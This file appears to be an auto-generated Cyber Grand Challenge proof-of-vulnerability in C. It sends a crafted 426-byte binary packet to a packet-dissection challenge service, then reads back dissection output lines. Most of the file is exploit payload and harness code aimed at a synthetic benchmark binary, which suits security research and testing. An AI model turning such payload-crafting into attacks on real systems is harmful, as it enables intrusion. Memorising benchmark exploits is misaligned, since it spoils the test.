#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xaa\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x92\x01\x00\x00\x8a\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x8a\x01\x00\x00"
         "\x1f\x2c\xb4\xfe\xf7\x7c\x4a\xac\xff\x88\x0c\xd6\x8a\x34\x21\xbe"
         "\xcb\xff\xc8\x6d\x0d\x00\x00\x00\x41\x00\x01\xbf\xf8\xb3\x15\xd4"
         "\x89\x3d\xb5\x78\x9a\xc7\xf2\x51\x6f\x3d\xb3\xf0\xff\x1c\x11\xb6"
         "\xad\xdb\x00\x35\x4b\x05\x18\x1b\x27\x4b\xf4\xbb\xf2\xcf\x41\xd9"
         "\xef\x1b\x36\x89\xeb\xd2\x8e\x7e\x7b\x5c\x19\x1f\xde\xe5\xb5\x13"
         "\xb1\xe6\x1d\x49\x68\xe6\x1a\xf9\xdf\x4c\x9b\xf9\xa5\xaf\x8d\x80"
         "\x89\xe3\x4f\x12\xd6\x22\xad\xca\x32\xdb\x35\x85\x81\x1e\x2d\x7b"
         "\x97\x27\x67\xa0\xa0\x66\xdd\xf9\x54\x35\x8d\x95\x52\x35\xa4\x5e"
         "\x49\xee\x83\xee\xbe\xd1\x33\xdc\x73\x6b\x98\x4b\x7b\x93\xd8\xa8"
         "\x44\x3b\x5f\xce\xf5\x12\x9b\x6c\xcc\x96\xa7\x89\xcf\xd8\x67\xa4"
         "\x29\xcb\x19\x84\xc4\xdf\xfa\xc3\x7f\x32\x23\x01\x63\x2f\x75\xd5"
         "\x4c\xcc\xc6\xfb\x46\xa1\xdc\xb9\x4b\x70\xbe\x47\x4d\x55\x01\x0c"
         "\xb4\x04\x50\xec\xf6\xaa\xaa\x2f\x70\x55\xeb\x27\x2d\x49\x0a\xf4"
         "\x22\x0e\xe6\x35\x77\x20\xbd\xef\x57\x81\x17\xf2\x15\xa7\xba\x22"
         "\xe5\x1a\xef\x20\x0b\x86\xc7\x99\xd0\x76\x0b\x3f\x2c\x1f\x63\x15"
         "\xd8\x10\xde\x74\xd9\xfd\x9b\xa7\xaf\xa1\xb7\xda\x63\x4f\xf4\x39"
         "\xe6\x77\xbd\xa1\x51\x26\xec\x10\x80\xaa\x3d\x02\x3e\xf3\x60\x87"
         "\xd9\x4b\x78\x4f\x8e\x2c\x5a\xe4\xa9\xa9\xe4\x19\x17\x98\x8e\x51"
         "\xa7\xe6\x20\xcd\xe2\xcd\xdd\xf9\xc5\x0c\xd6\xea\x41\x00\x4d\x57"
         "\x2b\x01\x43\xfa\x85\xfc\x71\x4e\xde\x4e\x5e\x01\x58\x01\x0f\x01"
         "\x12\x01\x00\xde\x89\xc7\x4a\xc7\xd1\x89\x39\xbd\x07\x3c\xc8\xd5"
         "\xc2\x8a\x2a\x70\xfb\xe8\xac\x8f\x5d\x14\xd4\x00\xad\x22\xd8\xdf"
         "\xf3\xe8\x1e\xea\x41\x00\x17\x5c\xf5\xdc\xa0\x7e\x46\x17\x5a\x2a"
         "\x69\x1c\xc3\x4a\xf5\xe1\xb9\xa2\x23\xa7\x7a\xec\x8e\x5d\x19\xf6"
         "\x32\x4d\x71\x01\x00\xa4\x1f\x96\x50\xe0";
      static unsigned int write_00001_00000_len = 426;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamatelodendron
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x74\x65\x6c\x6f\x64\x65"
         "\x6e\x64\x72\x6f\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
